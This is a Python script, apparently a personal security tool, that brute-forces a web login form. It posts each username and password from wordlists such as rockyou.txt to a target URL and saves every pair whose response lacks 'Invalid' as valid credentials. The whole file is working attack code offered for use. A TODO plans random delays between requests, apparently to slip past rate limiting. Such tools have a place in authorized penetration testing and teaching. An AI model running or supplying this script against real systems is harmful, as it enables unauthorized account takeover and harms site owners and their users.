#! /usr/bin/python3.12
"""
Brute force a web form.


usage: form_force.py [-h] [-u USERNAME] [-p PASSWORD] [-o OUTPUT] [-v] [-uf USERNAME_FIELD] [-pf PASSWORD_FIELD] host page

example: python .\code\form_force.py 10.0.0.40 /login.php -u .\test_files\usernames.txt -p .\test_files\rockyou.txt -o results.txt -v

positional arguments:
  host                  URL or IP address of the host
  page                  Path to the form

options:
  -h, --help            show this help message and exit
  -u USERNAME, --username USERNAME
                        Username or file of usernames
  -p PASSWORD, --password PASSWORD
                        Password or file of passwords
  -o OUTPUT, --output OUTPUT
                        Output file
  -v, --verbose         Verbose output
  -uf USERNAME_FIELD, --username-field USERNAME_FIELD
                        Username field name
  -pf PASSWORD_FIELD, --password-field PASSWORD_FIELD
                        Password field name


TODO Improvements:
 - Threading
 - Random time between requests
 - pause/resume?
"""
import argparse
import logging
from pathlib import Path
import requests


HEADERS = {}


def brute_force_form(host, page, unames, pwords, out, uname_field, pword_field):
    """ """
    if not page.startswith("/"):
        page = f"/{page}"

    dest = f"http://{host}{page}"
    logging.info(f"Brute forcing {dest} with {len(unames)} usernames and {len(pwords)} passwords")

    cnt = 0
    for uname in unames:
        uname = uname.strip()
        for pword in pwords:
            pword = pword.strip()
            logging.debug(f"Sending POST request with {uname}:{pword}")

            response = requests.post(
                dest,
                data={uname_field: uname, pword_field: pword},
            )

            if response.status_code != 200:
                logging.error(f"Unexpected status code: {response.status_code}")
                exit(1)

            if "Invalid" not in response.text:
                out.write(f"{uname}:{pword}\n")
                logging.debug(f"Valid credentials found: {uname}:{pword}")
        cnt += 1
        logging.info(f"Attempted {cnt} usernames")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute force a web form")
    parser.add_argument("host", type=str, help="URL or IP address of the host")
    parser.add_argument("page", type=str, help="Path to the form")
    parser.add_argument("-u", "--username", type=str, help="Username or file of usernames")
    parser.add_argument("-p", "--password", type=str, help="Password or file of passwords")
    parser.add_argument("-o", "--output", type=str, help="Output file", default="logins.txt")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument(
        "-uf", "--username-field", type=str, help="Username field name", default="uid"
    )
    parser.add_argument(
        "-pf", "--password-field", type=str, help="Password field name", default="password"
    )
    args = parser.parse_args()

    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.INFO)

    if Path(args.username).is_file():
        logging.info(f"Using usernames from file {args.username}")
        with open(args.username, "r", encoding='utf-8') as f:
            unames = f.readlines()
    else:
        unames = [args.username]

    if Path(args.password).is_file():
        logging.info(f"Using passwords from file {args.password}")
        with open(args.password, "r", encoding='utf-8') as f:
            pwords = f.readlines()
    else:
        pwords = [args.password]

    with open(args.output, "w") as out:
        logging.info(f"Writing valid credentials to {args.output}")
        brute_force_form(
            args.host, args.page, unames, pwords, out, args.username_field, args.password_field
        )
